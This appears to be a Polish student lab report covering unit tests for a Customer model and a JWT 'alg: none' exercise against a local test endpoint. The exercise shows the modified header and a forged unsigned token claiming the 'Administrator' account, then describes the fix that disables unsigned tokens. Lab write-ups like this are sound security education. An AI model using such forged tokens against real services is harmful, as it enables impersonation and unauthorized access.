# Zadanie 1

Testy jednostkowe został zrealizowane dla obiektów Customer - `project/customers/models.py`

Na poniższym zrzucie ekranu widać, że większość testów nie przechodzi, a tym samym proces budowy obrazu kończy się porażką, ponieważ pytest zwraca exit code = 1

![alt text](image.png)

# Zadanie 2
Bazowy token otrzymany dla Boba:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50IjoiQm9iIiwicm9sZSI6IlVzZXIiLCJpYXQiOjE3MzYyNjE0NTAsImF1ZCI6Imh0dHBzOi8vMTI3LjAuMC4xL2p3dC9ub25lIn0.Ydf_sp5vXcPQdSkp-Aa_jUBHZ9NT0GmwggzI6Vgmka0
```
By wykorzystać podatność należało zmienić algotrym JWT na "none" oraz pominąć podpis
```json
    {"alg":"none","typ":"JWT"}
```

![alt text](image-2.png)

Przygotowany token:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhY2NvdW50IjoiQWRtaW5pc3RyYXRvciIsInJvbGUiOiJVc2VyIiwiaWF0IjoxNzM2MjYyMDQzLCJhdWQiOiJodHRwczovLzEyNy4wLjAuMS9qd3Qvbm9uZSJ9.
```

W ramach poprawki usunąłem obsługę niepodpisanych tokenów - obsługę algorytmu none

![alt text](image-3.png)